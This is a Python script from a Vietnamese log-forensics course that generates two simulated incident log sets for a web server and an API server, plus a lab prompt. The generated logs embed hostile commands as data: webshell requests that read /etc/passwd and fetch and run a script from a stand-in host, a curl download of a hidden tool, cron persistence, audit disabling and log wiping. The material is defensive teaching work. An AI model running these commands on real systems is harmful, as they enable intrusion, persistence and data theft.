#!/usr/bin/env python3
# tao-vu.py — sinh HAI bộ log điều tra của Chương 14, khoá "Đọc & làm chủ log từ A–Z" (cuongthai.com).
#   python3 tao-vu.py [thư mục]   → <thư mục>/vu14 (vụ web01 — dùng trong bài 14.1–14.7) và <thư mục>/lab14 (vụ api02 — Lab 14)
# Vì sao SINH thay vì tấn công thật: dựng tấn công lên máy thật không phải việc của khoá đọc log. Đây là log GIẢ LẬP
# nhưng đúng từng định dạng của Ubuntu 24.04 (rsyslog RFC 3339, sshd, sudo, useradd, auditd), nginx và pino —
# đã đối chiếu với log thật của máy ảo lab7 ở Chương 7–8. Không ngẫu nhiên thật: chạy lại ⇒ giống từng byte, đáp số trong bài khớp.
# Mọi IP thuộc dải tài liệu RFC 5737 (192.0.2.x, 198.51.100.x, 203.0.113.x) hoặc dải nội bộ 10.x; tên miền .example.
import gzip, json, os, sys, hashlib
from datetime import datetime, timedelta, timezone

GOC = os.path.abspath(os.path.expanduser(sys.argv[1] if len(sys.argv) > 1 else "."))
VN = timezone(timedelta(hours=7)); UTC = timezone.utc

class Lcg:
    def __init__(self, seed): self.s = seed & 0xFFFFFFFF
    def next(self):
        self.s = (1103515245 * self.s + 12345) & 0x7FFFFFFF
        return self.s
    def num(self, n): return (self.next() >> 16) % n
    def pick(self, xs): return xs[self.num(len(xs))]

def ghi(rel, lines):
    p = os.path.join(GOC, rel); os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w", encoding="utf-8", newline="\n") as f: f.write("\n".join(lines) + ("\n" if lines else ""))

THANG = "Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split()
def clf(t): return f"{t.day:02d}/{THANG[t.month-1]}/{t.year}:{t:%H:%M:%S} +0700"
def r3339(t): return t.strftime("%Y-%m-%dT%H:%M:%S.%f") + "+07:00"
def vn(s): return datetime.strptime(s, "%Y-%m-%d %H:%M:%S").replace(tzinfo=VN)
def rid(r): return "".join("0123456789abcdef"[r.num(16)] for _ in range(32))

UA_TT = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Safari/537.36",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 19_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.1 Mobile/15E148 Safari/604.1",
         "Mozilla/5.0 (Linux; Android 16; SM-A566E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0 Mobile Safari/537.36"]
TRANG = ["/", "/san-pham", "/san-pham/ao-thun-trang", "/san-pham/giay-chay-bo", "/gio-hang", "/static/app.js", "/static/style.css", "/api/san-pham?trang=2"]
KHACH = [f"{t}@mail.example" for t in "lan hoa minh tuan nga duc thu hung linh phuong quang trang son mai khoa".split()]

class Nhat:  # gom dòng theo thời điểm rồi xếp — mỗi nguồn một Nhat
    def __init__(self): self.d = []
    def them(self, t, s): self.d.append((t, len(self.d), s))
    def dong(self): return [s for _, _, s in sorted(self.d)]

# ───────────────────────────── VỤ 1: web01 (bài 14.1–14.7) ─────────────────────────────
def vu14():
    r = Lcg(1411); H = "web01"
    auth, sysl, acc, app, aud, remote = Nhat(), Nhat(), Nhat(), Nhat(), Nhat(), Nhat()
    def np(t): return 1000 + int((t - vn("2026-11-05 00:00:00")).total_seconds() * 1000) // 400  # PID tăng theo thời gian như máy thật
    def A(t, prog, msg, xoa=False):  # dòng auth.log; xoa=True: kẻ tấn công đã sed xoá khỏi tệp CỤC BỘ, bản gửi về logsrv vẫn còn
        t = t + timedelta(microseconds=r.num(30000)); s = f"{r3339(t)} {H} {prog}: {msg}"
        if not xoa: auth.them(t, s)
        if not (t >= vn("2026-11-19 02:24:10") and t < vn("2026-11-19 09:31:00")): remote.them(t, s)
    def S(t, prog, msg):
        t = t + timedelta(microseconds=r.num(30000)); s = f"{r3339(t)} {H} {prog}: {msg}"; sysl.them(t, s)
        if not (t >= vn("2026-11-19 02:24:10") and t < vn("2026-11-19 09:31:00")): remote.them(t, s)
    def W(t, ip, meth, path, st, size, ua, ref="-", rt=None, reqid=None):
        reqid = reqid or rid(r); rt = rt if rt is not None else (8 + r.num(90)) / 1000
        acc.them(t, f'{ip} - - [{clf(t)}] "{meth} {path} HTTP/1.1" {st} {size} "{ref}" "{ua}" rid={reqid} rt={rt:.3f}')
        return reqid
    def J(t, lvl, msg, reqid, **kw):
        o = {"level": lvl, "time": int(t.timestamp() * 1000) + r.num(900), "pid": 812, "hostname": H, "reqId": reqid, "msg": msg}; o.update(kw)
        app.them(t, json.dumps(o, ensure_ascii=False, separators=(",", ":")))
    seq = [7200]
    def U(t, typ, body):
        seq[0] += 1 + r.num(30); e = t.astimezone(UTC).timestamp() + r.num(999) / 1000; seq.append(f"{e:.3f}")
        aud.them(t, f"type={typ} msg=audit({e:.3f}:{seq[0]}): {body}")
        return seq[0]

    # 1) Đường nền 14 ngày (05/11 → 18/11): deploy đăng nhập bằng KHOÁ từ máy CI 10.0.5.20 giờ hành chính, an (quản trị) từ 10.0.5.31,
    #    cron mỗi giờ, nhiễu SSH từ Internet mỗi ngày, sudo của deploy chỉ "systemctl restart shop".
    ngay0 = vn("2026-11-05 00:00:00")
    NHIEU = ["admin", "root", "test", "ubuntu", "oracle", "user", "postgres", "git", "pi", "ftpuser"]
    for d in range(15):
        ngay = ngay0 + timedelta(days=d)
        for h in range(24):
            if d == 14 and h > 9: break
            t = ngay + timedelta(hours=h, minutes=17, seconds=1)
            p = np(t); A(t, f"CRON[{p}]", "pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)")
            A(t + timedelta(seconds=1), f"CRON[{p}]", "pam_unix(cron:session): session closed for user root")
            S(t, f"CRON[{p}]", "(root) CMD (cd / && run-parts --report /etc/cron.hourly)")
            if not (vn("2026-11-19 02:22:30") <= t < vn("2026-11-19 09:29:31")):
                U(t, "USER_START", f"pid={p} uid=0 auid=0 ses={9000 + d * 24 + h + (1 if d == 14 and h >= 2 else 0)} subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_permit,pam_unix acct=\"root\" exe=\"/usr/sbin/cron\" hostname=? addr=? terminal=cron res=success'")
        for k in range(18 + r.num(14)):   # nhiễu Internet: bot dò ssh cả ngày, mỗi IP vài lần
            t = ngay + timedelta(seconds=r.num(86400))
            if d == 14 and t >= vn("2026-11-19 09:40:00"): continue
            ip = f"198.51.100.{1 + r.num(120)}"; u = r.pick(NHIEU); p = np(t); port = 30000 + r.num(30000)
            if u == "root": A(t, f"sshd[{p}]", f"Failed password for root from {ip} port {port} ssh2")
            else:
                A(t, f"sshd[{p}]", f"Invalid user {u} from {ip} port {port}")
                A(t + timedelta(seconds=2), f"sshd[{p}]", f"Failed password for invalid user {u} from {ip} port {port} ssh2")
            A(t + timedelta(seconds=3), f"sshd[{p}]", f"Connection closed by {'authenticating' if u == 'root' else 'invalid'} user {u} {ip} port {port} [preauth]")
        if ngay.weekday() < 5 and d < 14:
            for gio in ("08:3", "13:4"):
                t = vn(f"{ngay:%Y-%m-%d} {gio}{r.num(10)}:{r.num(60):02d}"); p = np(t); port = 40000 + r.num(20000)
                A(t, f"sshd[{p}]", f"Accepted publickey for deploy from 10.0.5.20 port {port} ssh2: ED25519 SHA256:q3Fd0w4vYb7Rk2mXcP9sLzT1aHnE6uJ8gV5yQ0iO2Ws")
                A(t + timedelta(milliseconds=40), f"sshd[{p}]", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)")
                A(t + timedelta(seconds=20), "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart shop")
                A(t + timedelta(seconds=20, milliseconds=40), "sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)")
                A(t + timedelta(seconds=21), "sudo", "pam_unix(sudo:session): session closed for user root")
                A(t + timedelta(seconds=40), f"sshd[{p}]", "pam_unix(sshd:session): session closed for user deploy")
            if d % 3 == 0:
                t = vn(f"{ngay:%Y-%m-%d} 10:1{r.num(10)}:{r.num(60):02d}"); p = np(t)
                A(t, f"sshd[{p}]", f"Accepted publickey for an from 10.0.5.31 port {40000 + r.num(20000)} ssh2: ED25519 SHA256:Zk81pQe3Lr0cVb6Nw2Xa7Ym5Ts4Hd9Fg1Uj0Ki8Lo3E")
                A(t + timedelta(milliseconds=40), f"sshd[{p}]", "pam_unix(sshd:session): session opened for user an(uid=1000) by an(uid=0)")
                A(t + timedelta(minutes=9), f"sshd[{p}]", "pam_unix(sshd:session): session closed for user an")
        # web: khách thật đăng nhập ~40 lần/ngày, ~5 % gõ sai; lưu lượng trang
        for k in range(36 + r.num(10)):
            t = ngay + timedelta(seconds=6 * 3600 + r.num(17 * 3600))
            if d == 14 and t >= vn("2026-11-19 09:40:00"): continue
            u = r.pick(KHACH); ip = f"203.0.113.{10 + r.num(50)}"; ua = r.pick(UA_TT)
            if r.num(20) == 0:
                q = W(t, ip, "POST", "/api/login", 401, 38, ua); J(t, 40, "login failed", q, user=u, ip=ip, reason="bad_password")
                t += timedelta(seconds=9 + r.num(20))
            q = W(t, ip, "POST", "/api/login", 200, 412, ua); J(t, 30, "login ok", q, user=u, ip=ip)
        for k in range(220 + r.num(60)):
            t = ngay + timedelta(seconds=r.num(86400))
            if d == 14 and t >= vn("2026-11-19 09:40:00"): continue
            W(t, f"203.0.113.{10 + r.num(50)}", "GET", r.pick(TRANG), 200, 900 + r.num(40000), r.pick(UA_TT))
        if d < 14:
            t = vn(f"{ngay:%Y-%m-%d} 23:59:00"); W(t, "10.0.5.40", "GET", "/healthz", 200, 2, "kube-probe/1.34", rt=0.001)
    # lan: khách quen ở VN, đăng nhập lúc khuya 01:02 đêm 19/11 (thật) — để thấy "di chuyển bất khả" khi bot dùng tài khoản này 19 phút sau
    t = vn("2026-11-19 01:02:44"); q = W(t, "203.0.113.23", "POST", "/api/login", 200, 412, UA_TT[1]); J(t, 30, "login ok", q, user="lan@mail.example", ip="203.0.113.23")

    # 2) Nhồi thông tin đăng nhập (credential stuffing) 01:05–01:35: 40 IP proxy dân dụng, mỗi IP 15 lượt, mỗi lượt MỘT email khác
    DS = KHACH + [f"kh{n:04d}@mail.example" for n in range(1, 600)]
    i = 0
    for k in range(600):
        ip = f"198.51.100.{130 + (k % 40)}"; t = vn("2026-11-19 01:05:00") + timedelta(seconds=k * 3 + r.num(3))
        u = DS[(k * 37 + 11) % len(DS)]
        ok = u in ("lan@mail.example", "hoa@mail.example") and i < 2
        ua = "python-requests/2.33.0" if k % 40 < 6 else UA_TT[0]
        if ok:
            i += 1; q = W(t, ip, "POST", "/api/login", 200, 412, ua); J(t, 30, "login ok", q, user=u, ip=ip)
        else:
            q = W(t, ip, "POST", "/api/login", 401, 38, ua, rt=0.120 + r.num(40) / 1000)
            J(t, 40, "login failed", q, user=u, ip=ip, reason="no_such_user" if u[2:6].isdigit() and int(u[2:6]) > 350 else "bad_password")

    # 3) Rải mật khẩu (password spraying) qua SSH: 3 đợt cách 17 phút, mỗi đợt 25 tên × 1 mật khẩu, từ 203.0.113.77
    TEN = ["admin", "root", "deploy", "an", "backup", "ubuntu", "test", "oracle", "postgres", "git", "jenkins", "www-data", "ftp", "user", "dev",
           "support", "guest", "mysql", "nagios", "ansible", "docker", "minecraft", "teamspeak", "hadoop", "elastic"]
    THAT = {"root", "deploy", "an", "backup", "www-data"}
    for dot, bd in enumerate(["01:40:03", "01:57:05", "02:14:00"]):
        t0 = vn(f"2026-11-19 {bd}")
        for j, u in enumerate(TEN):
            t = t0 + timedelta(milliseconds=480 * j + r.num(200)); p = np(t); port = 50000 + dot * 100 + j
            if dot == 2 and u == "deploy":
                A(t, f"sshd[{p}]", f"Accepted password for deploy from 203.0.113.77 port {port} ssh2", xoa=True)
                A(t + timedelta(milliseconds=40), f"sshd[{p}]", "pam_unix(sshd:session): session opened for user deploy(uid=1001) by deploy(uid=0)")
                pdeploy = p; tdeploy = t; continue
            x = True
            if u in THAT: A(t, f"sshd[{p}]", f"Failed password for {u} from 203.0.113.77 port {port} ssh2", xoa=x)
            else:
                A(t, f"sshd[{p}]", f"Invalid user {u} from 203.0.113.77 port {port}", xoa=x)
                A(t + timedelta(milliseconds=90), f"sshd[{p}]", f"Failed password for invalid user {u} from 203.0.113.77 port {port} ssh2", xoa=x)
            A(t + timedelta(milliseconds=150), f"sshd[{p}]", f"Connection closed by {'authenticating' if u in THAT else 'invalid'} user {u} 203.0.113.77 port {port} [preauth]", xoa=x)

    P0 = np(vn("2026-11-19 02:15:00"))  # PID quanh lúc kẻ tấn công vào
    # 4) Sau khi vào: sudo bash, tạo tài khoản, khoá SSH, tải công cụ, cron + systemd, tắt auditd, xoá dấu, cắt gửi log
    t = vn("2026-11-19 02:15:02")
    A(t, "sudo", "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/bash", xoa=True)
    A(t + timedelta(milliseconds=40), "sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)", xoa=True)
    U(t + timedelta(seconds=1), "USER_CMD", f"pid={P0+12} uid=1001 auid=1001 ses=9338 subj=unconfined msg='cwd=\"/home/deploy\" cmd=\"bash\" exe=\"/usr/bin/sudo\" terminal=pts/1 res=success'")
    t = vn("2026-11-19 02:16:02")
    A(t, f"useradd[{P0+71}]", "new group: name=sysupdate, GID=1003", xoa=True)
    A(t + timedelta(milliseconds=40), f"useradd[{P0+71}]", "new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1", xoa=True)
    A(t + timedelta(seconds=3), f"usermod[{P0+75}]", "add 'sysupdate' to group 'sudo'", xoa=True)
    A(t + timedelta(seconds=3, milliseconds=40), f"usermod[{P0+75}]", "add 'sysupdate' to shadow group 'sudo'", xoa=True)
    A(t + timedelta(seconds=9), f"chpasswd[{P0+78}]", "pam_unix(chpasswd:chauthtok): password changed for sysupdate", xoa=True)
    U(t, "ADD_USER", f"pid={P0+71} uid=0 auid=1001 ses=9338 subj=unconfined msg='op=add-user id=1003 exe=\"/usr/sbin/useradd\" hostname=web01 addr=? terminal=pts/1 res=success'")
    U(t + timedelta(seconds=3), "ADD_GROUP", f"pid={P0+75} uid=0 auid=1001 ses=9338 subj=unconfined msg='op=add-user-to-group grp=\"sudo\" acct=\"sysupdate\" exe=\"/usr/sbin/usermod\" hostname=web01 addr=? terminal=pts/1 res=success'")
    t = vn("2026-11-19 02:17:10")
    n = U(t, "SYSCALL", f"arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c items=2 ppid={P0+13} pid={P0+90} auid=1001 uid=0 gid=0 euid=0 ses=9338 tty=pts1 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"ssh_keys\"")
    aud.them(t, f"type=PATH msg=audit({seq[-1]}:{n}): item=1 name=\"/root/.ssh/authorized_keys\" inode=262411 dev=fd:01 mode=0100600 ouid=0 ogid=0 nametype=CREATE")
    t = vn("2026-11-19 02:18:40")
    n = U(t, "SYSCALL", f"arch=c000003e syscall=59 success=yes exit=0 items=2 ppid={P0+13} pid={P0+102} auid=1001 uid=0 gid=0 euid=0 ses=9338 tty=pts1 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"tai_ve\"")
    aud.them(t, f"type=EXECVE msg=audit({seq[-1]}:{n}): argc=5 a0=\"curl\" a1=\"-so\" a2=\"/tmp/.x/kworkerd\" a3=\"http://203.0.113.77:8000/k\" a4=\"--create-dirs\"")
    t = vn("2026-11-19 02:19:05")
    n = U(t, "SYSCALL", f"arch=c000003e syscall=257 success=yes exit=3 items=2 ppid={P0+13} pid={P0+111} auid=1001 uid=0 gid=0 euid=0 ses=9338 tty=pts1 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"cron\"")
    aud.them(t, f"type=PATH msg=audit({seq[-1]}:{n}): item=1 name=\"/etc/cron.d/dbus-sync\" inode=262433 dev=fd:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE")
    t = vn("2026-11-19 02:20:12")
    n = U(t, "SYSCALL", f"arch=c000003e syscall=257 success=yes exit=3 items=2 ppid={P0+13} pid={P0+120} auid=1001 uid=0 gid=0 euid=0 ses=9338 tty=pts1 comm=\"bash\" exe=\"/usr/bin/bash\" subj=unconfined key=\"systemd\"")
    aud.them(t, f"type=PATH msg=audit({seq[-1]}:{n}): item=1 name=\"/etc/systemd/system/dbus-sync.service\" inode=262440 dev=fd:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE")
    S(t + timedelta(seconds=2), "systemd[1]", f"Reloading requested from client PID {P0+123} ('systemctl') (unit session-9338.scope)...")
    S(t + timedelta(seconds=3), "systemd[1]", "Started dbus-sync.service - D-Bus session sync helper.")
    t = vn("2026-11-19 02:22:30")
    U(t, "CONFIG_CHANGE", "op=set audit_enabled=0 old=1 auid=1001 ses=9338 subj=unconfined res=1")
    t = vn("2026-11-19 02:23:05")   # sed -i trên auth.log (các dòng xoa=True biến mất khỏi tệp cục bộ)
    t = vn("2026-11-19 02:24:08")
    S(t, "rsyslogd", '[origin software="rsyslogd" swVersion="8.2312.0" x-pid="611" x-info="https://www.rsyslog.com"] exiting on signal 15.')
    S(t + timedelta(seconds=2), "rsyslogd", f'[origin software="rsyslogd" swVersion="8.2312.0" x-pid="{P0+140}" x-info="https://www.rsyslog.com"] start')
    A(t + timedelta(seconds=40), "sudo", "pam_unix(sudo:session): session closed for user root")
    A(t + timedelta(seconds=41), f"sshd[{pdeploy}]", "pam_unix(sshd:session): session closed for user deploy")
    for m in range(25, 9 * 60 + 35, 5):  # cron chạy công cụ mỗi 5 phút
        tt = vn("2026-11-19 02:00:00") + timedelta(minutes=m, seconds=1); p = np(tt)
        S(tt, f"CRON[{p}]", "(root) CMD (/tmp/.x/kworkerd -q >/dev/null 2>&1)")
    # 5) Webshell + rút dữ liệu qua nginx từ một IP khác (192.0.2.10, VPS)
    ua = "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
    t = vn("2026-11-19 02:31:12")
    for k, c in enumerate(["id", "uname+-a", "ls+-la+/var/www/shop/exports", "ls+-la+/var/www/shop/exports"]):
        W(t + timedelta(seconds=40 * k), "192.0.2.10", "GET", f"/uploads/anh-2041.php?c={c}", 200, 180 + 90 * k, ua)
    W(vn("2026-11-19 02:47:13"), "192.0.2.10", "GET", "/exports/khach-hang-2026-11.csv.gz", 200, 18874211, ua, rt=41.207)
    W(vn("2026-11-19 02:48:30"), "192.0.2.10", "GET", "/uploads/anh-2041.php?c=rm+-f+/var/www/shop/exports/khach-hang-2026-11.csv.gz", 200, 0, ua)
    # 6) Sáng ra: an vào, bật lại auditd, gửi log lại
    t = vn("2026-11-19 09:28:41"); p = np(t)
    A(t, f"sshd[{p}]", "Accepted publickey for an from 10.0.5.31 port 44120 ssh2: ED25519 SHA256:Zk81pQe3Lr0cVb6Nw2Xa7Ym5Ts4Hd9Fg1Uj0Ki8Lo3E")
    A(t + timedelta(milliseconds=40), f"sshd[{p}]", "pam_unix(sshd:session): session opened for user an(uid=1000) by an(uid=0)")
    A(t + timedelta(seconds=50), "sudo", "      an : TTY=pts/0 ; PWD=/home/an ; USER=root ; COMMAND=/usr/sbin/auditctl -e 1")
    U(t + timedelta(seconds=50), "CONFIG_CHANGE", "op=set audit_enabled=1 old=0 auid=1000 ses=9347 subj=unconfined res=1")
    A(t + timedelta(minutes=2, seconds=19), "sudo", "      an : TTY=pts/0 ; PWD=/home/an ; USER=root ; COMMAND=/usr/bin/systemctl restart rsyslog")

    ghi("vu14/web01/var/log/auth.log", auth.dong())
    ghi("vu14/web01/var/log/syslog", sysl.dong())
    # đánh lại số thứ tự bản ghi auditd theo thời gian (bản ghi cùng sự kiện — SYSCALL/PATH/EXECVE — giữ chung một số)
    import re; moi, so = {}, [7200]
    def doi(m):
        if m.group(2) not in moi: so[0] += 1 + r.num(30); moi[m.group(2)] = so[0]
        return f"{m.group(1)}:{moi[m.group(2)]})"
    ghi("vu14/web01/var/log/audit/audit.log", [re.sub(r"(audit\([0-9.]+):([0-9]+)\)", doi, x) for x in aud.dong()])
    ghi("vu14/web01/var/log/nginx/access.log", acc.dong())
    ghi("vu14/web01/var/log/shop/app.jsonl", app.dong())
    ghi("vu14/logsrv/web01/auth-syslog.log", remote.dong())
    ghi("vu14/logsrv/canh-bao.log", [
        "2026-11-19T02:54:10+07:00 logsrv canh-bao: [IM_LANG] web01 không gửi dòng nào trong 30 phút (dòng cuối 2026-11-19T02:24:10+07:00)",
        "2026-11-19T09:31:05+07:00 logsrv canh-bao: [HOI_PHUC] web01 gửi lại sau 7 giờ 6 phút 55 giây"])
    ghi("vu14/thu-thap/stat.txt", [  # người trực thu lúc 09:35 — ls/stat trên web01
        "web01:~$ grep -E 'auth|syslog' /etc/logrotate.d/rsyslog -A3 | head -n 4   # máy này xoay log HẰNG THÁNG (cấu hình công ty)",
        "/var/log/syslog",
        "/var/log/auth.log",
        "{",
        "        monthly",
        "web01:~$ sudo stat -c '%i | %s byte | sinh %w | sửa %y | %n' /var/log/auth.log /var/log/syslog",
        f"262455 | {len(chr(10).join(auth.dong()).encode()) + 1} byte | sinh 2026-11-19 02:23:05.660127311 +0700 | sửa 2026-11-19 09:31:02.118422790 +0700 | /var/log/auth.log",
        f"262170 | {len(chr(10).join(sysl.dong()).encode()) + 1} byte | sinh 2026-11-01 00:00:01.204511873 +0700 | sửa 2026-11-19 09:35:01.330981244 +0700 | /var/log/syslog",
        "web01:~$ ls -la /home/deploy/.bash_history /root/.bash_history",
        "lrwxrwxrwx 1 deploy deploy 9 2026-11-19 02:15:00 /home/deploy/.bash_history -> /dev/null",
        "-rw------- 1 root   root   0 2026-11-19 02:23:41 /root/.bash_history",
        "web01:~$ cat /etc/cron.d/dbus-sync",
        "*/5 * * * * root /tmp/.x/kworkerd -q >/dev/null 2>&1",
        "web01:~$ ls -la /var/www/shop/uploads/ | tail -n 2",
        "-rw-r--r-- 1 www-data www-data  88213 2026-11-12 14:02:11 anh-2039.jpg",
        "-rw-r--r-- 1 root     root        412 2026-11-19 02:29:58 anh-2041.php"])
    ghi("vu14/geo.csv", ["# mạng,quốc_gia,ghi_chú  (bảng GeoIP thu nhỏ của bài — dải IP tài liệu RFC 5737 được GÁN quốc gia cho bài tập)",
        "10.0.0.0/8,LAN,mạng nội bộ công ty", "203.0.113.0/26,VN,nhà mạng VN (khách thật)", "203.0.113.64/26,DE,VPS Frankfurt",
        "198.51.100.0/25,BR,nhà mạng Brazil", "198.51.100.128/25,US,proxy dân dụng Mỹ", "192.0.2.0/24,NL,VPS Amsterdam"])

# ───────────────────────────── VỤ 2: api02 (Lab 14) ─────────────────────────────
def lab14():
    r = Lcg(2114); H = "api02"
    auth, sysl, acc, err = Nhat(), Nhat(), Nhat(), Nhat()
    def np(t): return 1000 + int((t - vn("2026-11-20 00:00:00")).total_seconds() * 1000) // 400
    def A(t, prog, msg): t = t + timedelta(microseconds=r.num(30000)); auth.them(t, f"{r3339(t)} {H} {prog}: {msg}")
    def S(t, prog, msg): t = t + timedelta(microseconds=r.num(30000)); sysl.them(t, f"{r3339(t)} {H} {prog}: {msg}")
    def W(t, ip, meth, path, st, size, ua, rt=None):
        rt = rt if rt is not None else (5 + r.num(60)) / 1000
        acc.them(t, f'{ip} - - [{clf(t)}] "{meth} {path} HTTP/1.1" {st} {size} "-" "{ua}" rt={rt:.3f}')
    ngay0 = vn("2026-11-20 00:00:00")
    for d in range(3):
        ngay = ngay0 + timedelta(days=d)
        for h in range(24):
            t = ngay + timedelta(hours=h, minutes=17, seconds=1)
            if t > vn("2026-11-22 09:00:00"): break
            p = np(t); A(t, f"CRON[{p}]", "pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)")
            A(t + timedelta(seconds=1), f"CRON[{p}]", "pam_unix(cron:session): session closed for user root")
            S(t, f"CRON[{p}]", "(root) CMD (cd / && run-parts --report /etc/cron.hourly)")
        for k in range(400 + r.num(80)):
            t = ngay + timedelta(seconds=r.num(86400))
            if t > vn("2026-11-22 09:00:00"): continue
            W(t, f"203.0.113.{10 + r.num(50)}", "GET", r.pick(["/api/v1/tin-tuc", "/api/v1/tin-tuc/12", "/", "/uploads/2026/10/banner.jpg", "/api/v1/su-kien"]), 200, 300 + r.num(9000), r.pick(UA_TT))
        if d < 2:
            t = vn(f"{ngay:%Y-%m-%d} 09:0{r.num(9)}:{r.num(60):02d}")
            W(t, "10.0.7.12", "POST", "/admin/login", 200, 220, UA_TT[0]); W(t + timedelta(minutes=3), "10.0.7.12", "GET", "/admin/bai-viet", 200, 15022, UA_TT[0])
    # Tối 21/11: dò thư mục (ffuf) 22:10–22:16, đoán mật khẩu admin 22:21–22:27, tải webshell 22:31, chạy lệnh, cài đào coin, thử sudo, dọn dấu
    ua_f = "Fuzz Faster U Fool v2.1.0-dev"; ip = "192.0.2.66"
    TU = ["admin", "backup", ".git/HEAD", ".env", "wp-login.php", "phpmyadmin", "config.php.bak", "server-status", "api/v1/debug", "uploads", "old", "test", "db.sql", "upload.php"]
    for k in range(1240):
        t = vn("2026-11-21 22:10:05") + timedelta(milliseconds=290 * k)
        w = TU[k] if k < len(TU) else f"{r.pick(['a','b','c','d','e','f','g','h','k','m','n','p','s','t'])}{r.pick(['dmin','ack','ms','api','ata','ev','ile','ogin','rivate','tatic'])}{k}"
        st = {"admin": 302, ".git/HEAD": 403, ".env": 403, "uploads": 301, "server-status": 403}.get(w, 404)
        W(t, ip, "GET", "/" + w, st, 153 if st == 404 else 162, ua_f, rt=0.002)
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
    for k in range(38):
        t = vn("2026-11-21 22:21:12") + timedelta(seconds=9 * k + r.num(4))
        W(t, ip, "POST", "/admin/login", 200 if k == 37 else 401, 220 if k == 37 else 61, ua, rt=0.150 + r.num(50) / 1000)
    t0 = vn("2026-11-21 22:27:30")
    W(t0, ip, "GET", "/admin/bai-viet", 200, 15022, ua)
    W(t0 + timedelta(minutes=3, seconds=12), ip, "GET", "/admin/media/tai-len", 200, 4211, ua)
    W(t0 + timedelta(minutes=3, seconds=55), ip, "POST", "/admin/media/tai-len", 200, 96, ua)
    lenh = ["id", "uname%20-a", "cat%20/etc/passwd", "sudo%20-n%20id", "cd%20/var/tmp%20%26%26%20curl%20-so%20x.sh%20http://192.0.2.66/x.sh%20%26%26%20sh%20x.sh",
            "crontab%20-l", "ps%20aux%20%7C%20grep%20kthreadd", "rm%20-f%20/var/tmp/x.sh"]
    t1 = vn("2026-11-21 22:32:20")
    for k, c in enumerate(lenh):
        W(t1 + timedelta(seconds=50 * k), ip, "GET", f"/uploads/2026/11/logo-moi.php?cmd={c}", 200, [54, 98, 1712, 0, 0, 77, 143, 0][k], ua, rt=0.041 if k != 4 else 3.812)
    t = t1 + timedelta(seconds=150)
    A(t, "sudo", "www-data : a password is required ; PWD=/var/www/api/public/uploads/2026/11 ; USER=root ; COMMAND=/usr/bin/id")
    t = t1 + timedelta(seconds=201)
    S(t + timedelta(seconds=2), f"crontab[{np(t)}]", "(www-data) REPLACE (www-data)")
    for m in range(0, 10 * 60 + 25):
        tt = vn("2026-11-21 22:36:00") + timedelta(minutes=m)
        if tt > vn("2026-11-22 09:00:00"): break
        p = np(tt); S(tt + timedelta(seconds=1), f"CRON[{p}]", "(www-data) CMD (/var/tmp/.cache/kthreadd -c /var/tmp/.cache/c.json >/dev/null 2>&1)")
        if m % 47 == 5:
            S(tt + timedelta(seconds=13), "kernel", f"[{(tt - vn('2026-11-20 00:00:00')).total_seconds() + 3121.4:.6f}] perf: interrupt took too long (3940 > 3930), lowering kernel.perf_event_max_sample_rate to 50000")
    W(vn("2026-11-21 23:06:41"), ip, "GET", "/uploads/2026/11/logo-moi.php?cmd=rm%20-f%20logo-moi.php", 200, 0, ua)
    W(vn("2026-11-21 23:07:02"), ip, "GET", "/uploads/2026/11/logo-moi.php?cmd=id", 404, 153, ua)
    err.them(vn("2026-11-21 22:31:25"), '2026/11/21 22:31:25 [warn] 941#941: *88412 a client request body is buffered to a temporary file /var/cache/nginx/client_temp/0000000412, client: 192.0.2.66, server: api02.example, request: "POST /admin/media/tai-len HTTP/1.1", host: "api02.example"')
    err.them(vn("2026-11-21 23:07:02"), '2026/11/21 23:07:02 [error] 941#941: *90133 open() "/var/www/api/public/uploads/2026/11/logo-moi.php" failed (2: No such file or directory), client: 192.0.2.66, server: api02.example, request: "GET /uploads/2026/11/logo-moi.php?cmd=id HTTP/1.1", host: "api02.example"')
    ghi("lab14/api02/var/log/auth.log", auth.dong())
    ghi("lab14/api02/var/log/syslog", sysl.dong())
    ghi("lab14/api02/var/log/nginx/access.log", acc.dong())
    ghi("lab14/api02/var/log/nginx/error.log", err.dong())
    ghi("lab14/DE-BAI.txt", [
        "Sáng 22/11/2026 09:00, giám sát báo api02 dùng 100 % CPU từ đêm qua. Bạn có log của api02 (thư mục api02/var/log)",
        "và 3 tệp EVTX công khai (user-4720, admin-4732, apt-4720-4698) của hai máy Windows trong cùng 'công ty' (mẫu EVTX-ATTACK-SAMPLES / EVTX-to-MITRE-Attack).",
        "Trả lời 10 câu hỏi trong bài Lab 14. Mọi giờ trong báo cáo ghi theo UTC."])

vu14(); lab14()
print("xong:", GOC)
